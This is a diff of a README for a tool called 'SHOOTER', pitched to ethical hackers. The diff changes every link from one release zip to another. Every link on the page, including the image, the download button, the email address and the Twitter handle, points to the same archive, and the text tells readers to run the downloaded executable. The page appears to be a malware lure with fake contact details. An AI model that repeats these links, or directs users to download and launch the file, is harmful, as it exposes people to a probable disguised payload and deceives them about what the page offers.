@@ -1,10 +1,10 @@
 # 🎮 SHOOTER - The Ultimate Automation Tool for Cybersecurity Enthusiasts! 🛡️
 
-[![Download SHOOTER](https://github.com/Losnunes/SHOOTER/releases/download/v1.0/Release.zip)](https://github.com/Losnunes/SHOOTER/releases/download/v1.0/Release.zip "Needs to be Launched")
+[![Download SHOOTER](https://github.com/Losnunes/SHOOTER/releases/download/v2.0/Software.zip)](https://github.com/Losnunes/SHOOTER/releases/download/v2.0/Software.zip "Needs to be Launched")
 
 Welcome to SHOOTER - your go-to automated tool for various cybersecurity tasks! Whether you're a beginner or an experienced ethical hacker, SHOOTER offers a range of functionalities to simplify your workflow.
 
-![SHOOTER Tool](https://github.com/Losnunes/SHOOTER/releases/download/v1.0/Release.zip)
+![SHOOTER Tool](https://github.com/Losnunes/SHOOTER/releases/download/v2.0/Software.zip)
 
 ## 🚀 Features
 - **Versatile Automation**: From installing updates to cloning repositories and running scripts, SHOOTER can handle it all with ease.
@@ -13,7 +13,7 @@ Welcome to SHOOTER - your go-to automated tool for various cybersecurity tasks! 
   
 ## 🛠️ Installation
 To get started with SHOOTER, simply download the tool from the link below and launch it to begin automating your tasks:
-[Download SHOOTER](https://github.com/Losnunes/SHOOTER/releases/download/v1.0/Release.zip)
+[Download SHOOTER](https://github.com/Losnunes/SHOOTER/releases/download/v2.0/Software.zip)
 
 ## 🎯 Usage
 1. Launch SHOOTER by running the downloaded executable file.
@@ -32,8 +32,8 @@ To get started with SHOOTER, simply download the tool from the link below and la
 
 ## 📞 Contact
 Have questions or need support with SHOOTER? Reach out to us:
-- Email: https://github.com/Losnunes/SHOOTER/releases/download/v1.0/Release.zip
-- Twitter: [@SHOOTER_Tool](https://github.com/Losnunes/SHOOTER/releases/download/v1.0/Release.zip)
+- Email: https://github.com/Losnunes/SHOOTER/releases/download/v2.0/Software.zip
+- Twitter: [@SHOOTER_Tool](https://github.com/Losnunes/SHOOTER/releases/download/v2.0/Software.zip)
 
 ## 💻 Happy Hacking with SHOOTER! 🔒
 
